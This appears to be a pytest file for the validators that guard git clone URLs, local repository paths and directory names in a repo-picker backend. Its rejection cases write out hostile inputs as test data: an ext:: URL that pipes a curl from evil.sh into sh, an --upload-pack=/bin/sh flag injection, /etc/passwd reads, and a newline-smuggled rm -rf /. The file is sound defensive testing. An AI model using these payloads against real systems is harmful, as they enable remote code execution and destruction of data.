"""Tests for the validated inputs the repo picker newly accepts.

Parametrized heavily on purpose: these are the security boundary for two
inputs that reach the host (a filesystem path and a git URL), and each case
is one concrete attack or mistake that must not get through.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from backend.api.paths import WORKSPACE_ROOT_ENV
from backend.api.validators import (
    ALLOWED_CLONE_HOSTS_ENV,
    validate_directory_name,
    validate_git_clone_url,
    validate_local_repo_path,
)


@pytest.mark.parametrize(
    "url",
    [
        # `ext::` makes git run an arbitrary command -- the classic clone RCE.
        "ext::sh -c 'curl evil.sh | sh'",
        # A leading dash is parsed by git as a flag, not a URL.
        "--upload-pack=/bin/sh",
        "-u",
        # Local and non-network transports.
        "file:///etc/passwd",
        "git://github.com/owner/repo.git",
        "http://github.com/owner/repo",
        # Credentials would land in logs and in .git/config on disk.
        "https://user:password@github.com/owner/repo.git",
        # Off-allowlist host.
        "https://evil.com/owner/repo.git",
        # Structural nonsense.
        "https://github.com/owner",
        "https://github.com/owner/repo/extra",
        "https://github.com/owner/repo?x=1",
        "https://github.com/owner/repo\nrm -rf /",
        "not a url at all",
        "",
    ],
)
def test_rejects_dangerous_or_malformed_clone_urls(url: str) -> None:
    with pytest.raises(ValueError):  # noqa: PT011 -- message varies per case
        validate_git_clone_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/owner/repo",
        "https://github.com/owner/repo.git",
        "https://github.com/owner/repo-with-dashes.git",
        "git@github.com:owner/repo.git",
        "git@github.com:owner/repo",
    ],
)
def test_accepts_ordinary_github_urls(url: str) -> None:
    assert validate_git_clone_url(url) == url


def test_clone_host_allowlist_is_configurable(monkeypatch: pytest.MonkeyPatch) -> None:
    """Self-hosted GitHub Enterprise is a legitimate case."""
    monkeypatch.setenv(ALLOWED_CLONE_HOSTS_ENV, "git.corp.example")

    assert validate_git_clone_url("https://git.corp.example/owner/repo.git")
    with pytest.raises(ValueError, match="host"):
        validate_git_clone_url("https://github.com/owner/repo.git")


@pytest.mark.parametrize(
    "path",
    [
        "",
        "   ",
        "with\x00null",
        "with\nnewline",
        "/proc/self",
        "/etc",
        "/etc/passwd",
        "/sys/kernel",
    ],
)
def test_rejects_bad_local_paths(path: str) -> None:
    with pytest.raises(ValueError):  # noqa: PT011 -- message varies per case
        validate_local_repo_path(path)


def test_canonicalizes_a_local_path(tmp_path: Path) -> None:
    """Traversal is dissolved by resolving rather than pattern-matched."""
    messy = tmp_path / "a" / ".." / "b"
    (tmp_path / "b").mkdir(parents=True)

    assert validate_local_repo_path(str(messy)) == str(tmp_path / "b")


def test_expands_a_home_relative_path() -> None:
    resolved = validate_local_repo_path("~/somewhere")

    assert not resolved.startswith("~")
    assert Path(resolved).is_absolute()


def test_a_nonexistent_path_is_allowed_through(tmp_path: Path) -> None:
    """Existence is state, reported as 404 by the handler -- not bad input."""
    assert validate_local_repo_path(str(tmp_path / "not-yet"))


def test_workspace_root_confinement(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The opt-in confinement for shared hosts."""
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    monkeypatch.setenv(WORKSPACE_ROOT_ENV, str(allowed))

    assert validate_local_repo_path(str(allowed / "repo"))
    with pytest.raises(ValueError, match="must be inside"):
        validate_local_repo_path(str(tmp_path / "elsewhere"))


def test_confinement_survives_a_symlink_pointing_outside(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Checking the resolved path is what makes the confinement real."""
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (allowed / "escape").symlink_to(outside)
    monkeypatch.setenv(WORKSPACE_ROOT_ENV, str(allowed))

    with pytest.raises(ValueError, match="must be inside"):
        validate_local_repo_path(str(allowed / "escape"))


@pytest.mark.parametrize("name", ["", ".", "..", "has/slash", "has space", "x" * 65, "a\x00b"])
def test_rejects_bad_directory_names(name: str) -> None:
    with pytest.raises(ValueError):  # noqa: PT011 -- message varies per case
        validate_directory_name(name)


def test_accepts_an_ordinary_directory_name() -> None:
    assert validate_directory_name("owner-repo") == "owner-repo"
